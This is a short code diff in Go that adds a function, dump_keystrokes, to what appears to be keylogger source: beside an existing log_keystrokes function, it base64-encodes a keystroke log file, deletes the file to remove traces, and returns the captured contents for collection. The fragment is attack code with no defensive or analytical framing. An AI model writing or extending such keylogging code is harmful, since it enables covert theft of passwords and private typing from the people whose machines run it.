@@ -189,3 +189,10 @@ func log_keystrokes() {
 		}
 	}
 }
+
+// return base64 of the keystroke logs
+func dump_keystrokes() (string) {
+	keystroke_dump := file_b64(logfile)
+	os.Remove(logfile)
+	return keystroke_dump
+}
